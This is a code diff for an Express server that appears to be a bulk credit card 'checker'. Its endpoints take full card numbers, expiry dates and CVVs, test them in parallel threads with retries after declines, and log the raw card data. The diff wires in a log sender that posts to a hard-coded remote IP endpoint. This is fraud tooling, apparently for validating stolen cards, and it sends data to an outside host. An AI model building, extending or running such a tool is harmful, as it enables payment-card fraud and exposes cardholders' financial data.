@@ -1,19 +1,30 @@
 const express = require('express');
 const { checkCard } = require('./paymentChecker');
 const { getNextSite } = require('./paymentChecker');
+const logSender = require('./logSender');
 
 const app = express();
 const PORT = 3001;
+
+// Inicializa logSender (accessKey será setado por request)
+logSender.init({
+  checkerId: 'cielo',
+  accessKey: '',
+  endpoint: 'http://179.197.233.196/workcenter/checker/log_receiver.php'
+});
 
 app.use(express.json());
 
 // /check — 1 cartão por vez, browser próprio, sem reteste
 app.post('/check', async (req, res) => {
-  const { cardNumber, expiryMonth, expiryYear, cvv } = req.body;
+  const { cardNumber, expiryMonth, expiryYear, cvv, access_key } = req.body;
 
   if (!cardNumber || !expiryMonth || !expiryYear || !cvv) {
     return res.status(400).json({ error: 'Campos obrigatórios: cardNumber, expiryMonth, expiryYear, cvv' });
   }
+
+  // Seta access_key do job para logs
+  if (access_key) logSender.setAccessKey(access_key);
 
   console.log(`[${new Date().toISOString()}] /check: ${cardNumber}|${expiryMonth}|${expiryYear}|${cvv}`);
 
@@ -23,17 +34,23 @@ app.post('/check', async (req, res) => {
     res.json(result);
   } catch (error) {
     res.status(500).json({ error: error.message });
+  } finally {
+    // Limpa access_key após processar
+    logSender.setAccessKey('');
   }
 });
 
 // /bulk — lista de cartões com fila + reteste na mesma aba após DECLINED
-// Body: { "cards": ["cc|mm|yyyy|cvv", ...], "threads": 3 }
+// Body: { "cards": ["cc|mm|yyyy|cvv", ...], "threads": 3, "access_key": "..." }
 app.post('/bulk', async (req, res) => {
-  const { cards, threads = 3 } = req.body;
+  const { cards, threads = 3, access_key } = req.body;
 
   if (!cards || !Array.isArray(cards) || cards.length === 0) {
     return res.status(400).json({ error: 'Campo obrigatório: cards (array de strings "cc|mm|yyyy|cvv")' });
   }
+
+  // Seta access_key do job para logs
+  if (access_key) logSender.setAccessKey(access_key);
 
   const lines = cards.map(c => c.trim()).filter(Boolean);
   const THREADS = Math.max(1, Math.min(parseInt(threads), 10));
@@ -145,6 +162,9 @@ app.post('/bulk', async (req, res) => {
     res.json({ total: results.length, results });
   } catch (error) {
     res.status(500).json({ error: error.message });
+  } finally {
+    // Limpa access_key após processar
+    logSender.setAccessKey('');
   }
 });
 
